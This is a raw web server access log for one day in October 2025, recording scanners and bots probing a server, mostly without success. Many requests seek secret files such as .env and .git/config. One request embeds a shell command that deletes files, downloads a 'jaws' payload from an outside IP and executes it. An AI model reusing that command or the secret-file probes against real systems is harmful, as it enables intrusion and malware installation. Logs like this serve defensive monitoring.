176.65.141.87 - - [15/Oct/2025:08:27:49 +0800] "GET / HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
106.227.49.113 - - [15/Oct/2025:08:36:26 +0800] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
87.120.191.91 - - [15/Oct/2025:08:44:02 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
176.65.141.86 - - [15/Oct/2025:08:50:21 +0800] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 179 "-" "-"
165.232.73.237 - - [15/Oct/2025:09:20:29 +0800] "GET /aaa9 HTTP/1.1" 404 159 "-" "Mozilla/5.0 zgrab/0.x"
165.232.73.237 - - [15/Oct/2025:09:20:37 +0800] "GET /aab8 HTTP/1.1" 404 159 "-" "Mozilla/5.0 zgrab/0.x"
165.232.73.237 - - [15/Oct/2025:09:20:45 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 zgrab/0.x"
79.124.40.174 - - [15/Oct/2025:09:29:43 +0800] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
204.76.203.219 - - [15/Oct/2025:09:43:51 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
213.209.157.162 - - [15/Oct/2025:09:50:01 +0800] "GET /.git/config HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0"
93.123.109.214 - - [15/Oct/2025:09:58:45 +0800] "\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03]1\xB2\xB2\xD3\x95\x14\xC0\xEAF8\x9B\xC0|\xC2\x9E8\xC2\x0ED\x9B|\xED\xD2mO\xC8#\xAE\x97\xA5\x1E y$/\xBAu&M\xEEa\xF7^\x98\xA2\xC1oI\xBA\x10\xD2\x88\xDA\xFF\xF2\xB8\xF0\xD2z\x92]#\xE5\xC7\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-"
93.123.109.214 - - [15/Oct/2025:09:58:46 +0800] "GET / HTTP/1.1" 400 157 "-" "-"
93.123.109.214 - - [15/Oct/2025:09:58:46 +0800] "GET / HTTP/1.1" 404 179 "-" "l9tcpid/v1.1.0"
198.235.24.14 - - [15/Oct/2025:10:13:02 +0800] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xFD\x9C\x80\xF6\x98\x1A" 400 157 "-" "-"
198.235.24.14 - - [15/Oct/2025:10:13:02 +0800] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xF8" 400 157 "-" "-"
204.76.203.219 - - [15/Oct/2025:10:24:31 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
204.76.203.212 - - [15/Oct/2025:10:28:20 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
198.235.24.242 - - [15/Oct/2025:10:28:37 +0800] "GET / HTTP/1.0" 404 179 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
79.124.40.174 - - [15/Oct/2025:10:51:27 +0800] "GET /actuator/gateway/routes HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
87.120.191.91 - - [15/Oct/2025:11:25:25 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
82.97.241.161 - - [15/Oct/2025:11:42:11 +0800] "GET /robots.txt HTTP/1.0" 404 179 "-" "xfa1"
170.106.167.214 - - [15/Oct/2025:11:43:18 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
176.65.141.87 - - [15/Oct/2025:11:50:47 +0800] "GET / HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
79.124.40.174 - - [15/Oct/2025:11:53:40 +0800] "\x16\x03\x01\x05\xA8\x01\x00\x05\xA4\x03\x03\x17\xB3\xC3\x01!\x11\x9B\x89\x88F8\x99\xCD\xE2>\xAD\x9F\xD7\x90\xAC\xBA\x0C\xF4\x00jg\xAD\xC6+K\xAF\xCC M\xE7t\xE0\xDC\xD9];\xC9\xF7\x1C\xE8\xC1\x16\xF5\xC3'\xEF-\xB1\x9D\xB0\xD1\xE0\x9C8I3B\x18,d\x00\x1A\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-"
176.65.141.86 - - [15/Oct/2025:11:59:24 +0800] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 179 "-" "-"
185.177.72.11 - - [15/Oct/2025:12:10:00 +0800] "GET /.git/config HTTP/1.1" 400 154 "-" "grub-client-1.5.3; (grub-client-1.5.3; Crawl your own stuff with http://grub.org)"
20.42.95.196 - - [15/Oct/2025:12:16:28 +0800] "MGLNDD_24.233.29.101_80" 400 157 "-" "-"
204.76.203.219 - - [15/Oct/2025:12:20:18 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
64.62.197.167 - - [15/Oct/2025:12:22:03 +0800] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x8A\xFAfv\x00\x16\xC2\x0F\xD9#.\x9F4C\x92i\x5C4\xA7[!\xF6\xE2\x9Cy$\xE6`\xD7d\xDA&\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
93.123.109.214 - - [15/Oct/2025:12:29:58 +0800] "\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03\x9E\xEA\xC2g\xF1\x19.\xD2a\x0Fz\xA2\x07\xDD\xF9{5cp\xE2\x9F\x078\xBDJ<'\xD7\xAD\xFD\x81\x19 q\x8F\xBD#\xAD2\xD1\x8AwK\xB2\x80L\xCA\xB3-\xF3\xB4\x0E\xE7\x909\x14\x94\x12\xB48\xB0\xBAU\xA7\xB2\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-"
93.123.109.214 - - [15/Oct/2025:12:29:58 +0800] "GET / HTTP/1.1" 400 157 "-" "-"
93.123.109.214 - - [15/Oct/2025:12:29:58 +0800] "GET / HTTP/1.1" 404 179 "-" "l9tcpid/v1.1.0"
43.157.50.58 - - [15/Oct/2025:12:47:52 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
213.209.157.254 - - [15/Oct/2025:12:48:45 +0800] "GET /.git/config HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) snap Chromium/75.0.3770.142 Chrome/75.0.3770.142 Safari/537.36"
185.177.72.8 - - [15/Oct/2025:13:39:55 +0800] "GET /.git/config HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1"
204.76.203.212 - - [15/Oct/2025:13:41:06 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
195.178.110.201 - - [15/Oct/2025:13:46:10 +0800] "GET /.env HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Linux; U; Android 1.5; en-gb; T-Mobile_G2_Touch Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1"
184.105.247.195 - - [15/Oct/2025:13:46:53 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0.0; Win64; x64; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.156 Not(A:Brand/24 YaBrowser/24.4.1.899 Yowser/2.5  Safari/537.36"
184.105.247.195 - - [15/Oct/2025:13:48:39 +0800] "GET /webui/ HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0"
184.105.247.195 - - [15/Oct/2025:13:50:26 +0800] "GET /favicon.ico HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0"
184.105.247.195 - - [15/Oct/2025:13:51:24 +0800] "GET /geoserver/web/ HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0.0; Win64; x64; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.156 Not(A:Brand/24 YaBrowser/24.4.1.899 Yowser/2.5  Safari/537.36"
195.178.110.201 - - [15/Oct/2025:14:06:05 +0800] "GET /.git/HEAD HTTP/1.1" 404 159 "-" "Mozilla/5.0 (OS/2; Warp 4.5; rv:31.0) Gecko/20100101 Firefox/31.0"
204.76.203.219 - - [15/Oct/2025:14:32:55 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
222.79.104.23 - - [15/Oct/2025:14:33:14 +0800] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
45.9.168.192 - - [15/Oct/2025:14:37:03 +0800] "\xC9\x94\xD1\xA6\xAE\x9C\x05lM/\x09\x8Cp#\xEE\x9D*5#]\xC7R:\xC8\x8E/\x11\xB8\xCD\x89Z\xFB\xA4\x19f\xD2\xCE\xB3\xA1\x81\xBB\xFC\xA0\xDD%d1\x17\xA6%n\xC5" 400 157 "-" "-"
45.9.168.192 - - [15/Oct/2025:14:37:03 +0800] "\x10 \x00\x00BBBB\xBA\x8C\xC1\xABDAAA" 400 157 "-" "-"
89.248.173.219 - - [15/Oct/2025:14:46:35 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0"
204.76.203.30 - - [15/Oct/2025:14:49:01 +0800] "GET /.env HTTP/1.1" 404 179 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.212.0 Safari/532.1"
204.76.203.30 - - [15/Oct/2025:14:49:01 +0800] "GET /backend/.env HTTP/1.1" 404 179 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)"
204.76.203.30 - - [15/Oct/2025:14:49:02 +0800] "GET /api/.env HTTP/1.1" 404 179 "-" "Mozilla/5.0 (iPad; CPU OS 7_0_3 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B511 Safari/9537.53"
204.76.203.30 - - [15/Oct/2025:14:49:03 +0800] "GET /admin/.env HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Linux; Android 6.0.1; XT1585 Build/MCK24.183-22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
204.76.203.30 - - [15/Oct/2025:14:49:04 +0800] "GET /?phpinfo=-1 HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-J327T1 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36"
204.76.203.30 - - [15/Oct/2025:14:49:05 +0800] "GET /app_dev.php/_profiler/phpinfo HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; rv:40.0) Gecko/20100101 Firefox/40.0"
204.76.203.30 - - [15/Oct/2025:14:49:06 +0800] "GET /.env.example HTTP/1.1" 404 179 "-" "Opera/9.80 (Linux mips; ) Presto/2.12.407 Version/12.51 MB97/0.39.24.3 (DIGIHOME, Mxl661L32, wireless) VSTVB_MB97  SmartTvA/3.0.0"
204.76.203.30 - - [15/Oct/2025:14:49:08 +0800] "GET /phpinfo/ HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 6.1; Intel Mac OS X 10.6; rv:7.0.1) Gecko/20100101 Firefox/7.0.1"
204.76.203.30 - - [15/Oct/2025:14:49:08 +0800] "GET /server/.env HTTP/1.1" 404 179 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36 OPR/49.0.2725.34"
204.76.203.30 - - [15/Oct/2025:14:49:08 +0800] "GET /phpinfo.php HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0"
204.76.203.30 - - [15/Oct/2025:14:49:09 +0800] "GET /tmp/env.save HTTP/1.1" 404 179 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) FxiOS/1.2 Mobile/13C75 Safari/601.1.46"
204.76.203.30 - - [15/Oct/2025:14:49:09 +0800] "GET /.env.development HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; tr-tr; LG-E986 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
204.76.203.30 - - [15/Oct/2025:14:49:10 +0800] "GET /.env.save HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
204.76.203.30 - - [15/Oct/2025:14:49:10 +0800] "GET /bot/.env HTTP/1.1" 404 179 "-" "Opera/9.23 (Windows NT 6.0; U; de)"
204.76.203.30 - - [15/Oct/2025:14:49:10 +0800] "GET /api/v2/.env HTTP/1.1" 404 179 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; MATBJS)"
204.76.203.30 - - [15/Oct/2025:14:49:11 +0800] "GET /tmp/.env.pem HTTP/1.1" 404 179 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MDDC; BRI/1; .NET4.0C; MS-RTC LM 8; MS-RTC EA 2)"
204.76.203.30 - - [15/Oct/2025:14:49:12 +0800] "GET /?url=.env HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T700 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.0 Chrome/38.0.2125.102 Safari/537.36"
204.76.203.30 - - [15/Oct/2025:14:49:12 +0800] "GET /tmp/.env.old HTTP/1.1" 404 179 "-" "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.0.11) Gecko/20070312 Firefox/1.5.0.11"
204.76.203.30 - - [15/Oct/2025:14:49:13 +0800] "GET /tmp/.env.log HTTP/1.1" 404 179 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2 like Mac OS X) AppleWebKit/601.1 (KHTML, like Gecko) CriOS/47.0.2526.70 Mobile/13C71 Safari/601.1.46"
204.76.203.30 - - [15/Oct/2025:14:49:13 +0800] "GET /test.php HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"
204.76.203.30 - - [15/Oct/2025:14:49:14 +0800] "GET /application/.env HTTP/1.1" 404 179 "-" "Nokia3230/2.0 (5.0614.0) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0"
204.76.203.30 - - [15/Oct/2025:14:49:15 +0800] "GET /.env.prod HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Linux; Android 5.0.1; LG-D852 Build/LRX21Y) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Mobile Safari/537.36"
204.76.203.30 - - [15/Oct/2025:14:49:16 +0800] "GET /production/.env HTTP/1.1" 404 179 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0"
204.76.203.30 - - [15/Oct/2025:14:49:17 +0800] "GET /dashboard/.env HTTP/1.1" 404 179 "-" "Opera/6.0 (Windows ME; U)  [de]"
204.76.203.30 - - [15/Oct/2025:14:49:17 +0800] "GET /config/.env HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 6.0; rv:30.0) Gecko/20100101 Firefox/30.0"
204.76.203.30 - - [15/Oct/2025:14:49:17 +0800] "GET /web/debug/default/view HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 (.NET CLR 3.5.30729)"
204.76.203.30 - - [15/Oct/2025:14:49:18 +0800] "GET /.config.yaml HTTP/1.1" 404 179 "-" "Opera/8.01 (Windows NT 5.1; U; fr)"
204.76.203.30 - - [15/Oct/2025:14:49:19 +0800] "GET /.json HTTP/1.1" 404 179 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_2 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A551 Safari/8536.25"
204.76.203.30 - - [15/Oct/2025:14:49:20 +0800] "GET /stage/.env HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991"
204.76.203.30 - - [15/Oct/2025:14:49:20 +0800] "GET /crm/.env HTTP/1.1" 404 179 "-" "Mozilla/5.0 (X11; U; Linux i686; lt-LT; rv:1.6) Gecko/20051114 Firefox/1.5"
204.76.203.30 - - [15/Oct/2025:14:49:21 +0800] "GET /.env.testing HTTP/1.1" 404 179 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36 OPR/49.0.2725.34"
176.65.141.87 - - [15/Oct/2025:14:54:28 +0800] "GET / HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
140.228.21.27 - - [15/Oct/2025:14:56:55 +0800] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.94 Safari/537.36"
87.120.191.91 - - [15/Oct/2025:15:02:20 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
93.123.109.214 - - [15/Oct/2025:15:41:50 +0800] "\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x031\xB4Ni\xD4`e\xA7sjjRg\xBA\xBE\xD6\x04\xC9\x8A\xBDL\xD8\x04\xFD\xB4\x1C\x94on\xDB\x19\x92 ZU41+_\xA1\xC2\x80(\xB5Y\xF0\xDFU$C\xA1\xA8\x88 ~\xDE\xC8\x19\xF2\x84\xA2\x89\x97\xCBb\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-"
93.123.109.214 - - [15/Oct/2025:15:41:50 +0800] "GET / HTTP/1.1" 400 157 "-" "-"
93.123.109.214 - - [15/Oct/2025:15:41:50 +0800] "GET / HTTP/1.1" 404 179 "-" "l9tcpid/v1.1.0"
164.90.161.183 - - [15/Oct/2025:15:59:30 +0800] "GET /.env HTTP/1.1" 404 159 "-" "Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);"
164.90.161.183 - - [15/Oct/2025:15:59:30 +0800] "GET /.git/config HTTP/1.1" 404 159 "-" "Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);"
203.93.173.11 - - [15/Oct/2025:16:01:31 +0800] "GET /shell?cd+/tmp;rm+-rf+*;wget+45.90.12.71/jaws;sh+/tmp/jaws HTTP/1.1" 499 0 "-" "Hello, world"
204.76.203.219 - - [15/Oct/2025:16:22:04 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.242.226.110 - - [15/Oct/2025:16:26:21 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
59.184.56.28 - - [15/Oct/2025:16:34:46 +0800] "POST /HNAP1/ HTTP/1.0" 400 0 "-" "-"
144.6.14.143 - - [15/Oct/2025:16:38:43 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:38:46 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:38:46 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:38:47 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:38:47 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:38:48 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:38:52 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:38:52 +0800] "GET /nobody/favicon.ico HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:03 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:07 +0800] "GET /favicon.ico HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:07 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:08 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:08 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:13 +0800] "GET /skin/default_1/images/logo.png HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:18 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:18 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:23 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:27 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:27 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:28 +0800] "GET /system.ini HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:28 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:29 +0800] "GET /image/lgbg.jpg HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:29 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:30 +0800] "GET /favicon.ico HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:30 +0800] "GET /cgi-bin/luci/api/auth HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
144.6.14.143 - - [15/Oct/2025:16:39:31 +0800] "GET / HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17"
